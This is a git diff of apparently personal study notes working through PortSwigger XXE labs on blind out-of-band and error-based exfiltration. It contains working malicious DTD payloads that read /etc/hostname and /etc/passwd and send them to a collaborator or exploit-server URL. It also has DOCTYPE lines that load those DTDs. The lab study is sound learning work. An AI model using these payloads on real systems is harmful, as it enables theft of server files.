@@ -176,12 +176,78 @@ To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
 1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 3. Place the Burp Collaborator payload into a malicious DTD file:
-    `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
-4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
-5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
-6. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
-    `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
+    `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %stack; %exfil;`
+1. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
+2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+3. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
+    `<!DOCTYPE test [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
 7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
 8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.
 
 Analysis:
+
+- first we will try an out of band exfiltration using burp collaborator/our exploit server
+
+    `<!DOCTYPE test [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL(server/exploit)"> %xxe;]>`
+
+    `<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "YOUR-DTD-URL(server/exploit)"> %loadDtd;]>`
+
+- we have to create a malicious DTD file(stored on our exploit server) in order to exfiltrate the data:
+	DTD file must contain a **file entity** and a **stack entity**(this method is also called stacked entities) || `&#x25;` represents the XML encoded of %  (because of entity inside of entity)
+
+Note:
+	In this case we have to retrieve a single line file (/etc/hostname) so we can manage this via building the DTD pointing to the exploit server .
+
+- DTD exploit file (for /etc/hostname)
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a36000204174338c4c637de0106008f.exploit-server.net/?X=%file;'>">
+%stack;
+%exfil;
+```
+
+- now we are calling inside of DOCTYPE our DTD exploit file which is stored on the server:![[Pasted image 20240927220556.png]]
+OR calling entities outside the DTD file
+	![[Pasted image 20240927221138.png]]  
+
+## **6. Exploiting blind XXE to retrieve data via error messages**
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.
+The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
+
+1. Click "Go to exploit server" and save the following malicious DTD file on your server:
+    `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`
+    When imported, this page will read the contents of `/etc/passwd` into the `file` entity, and then try to use that entity in a file path.
+    
+1. Click "View exploit" and take a note of the URL for your malicious DTD.
+2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+3. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
+
+    `<!DOCTYPE test [<!ENTITY % loadDTD SYSTEM "YOUR-DTD-URL"> %loadDTD;]>`
+    
+    You should see an error message containing the contents of the `/etc/passwd` file.
+
+
+Analysis:
+
+- out of band XXE using a DTD exploit file 
+    `<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "YOUR-DTD-URL(server/exploit)"> %loadDtd;]>`
+
+- reading multi-line data 
+		![[Pasted image 20240927230532.png]]
+		![[Pasted image 20240927230626.png]]
+
+- DTD exploit file( for /etc/passwd )
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'file:///idonotexist/%file;'>"> 
+%stack; 
+%error;
+```
+	![[Pasted image 20240927231719.png]]
+	![[Pasted image 20240927232654.png]]
+
+
+## **7.  Exploiting XInclude to retrieve files**
+
+
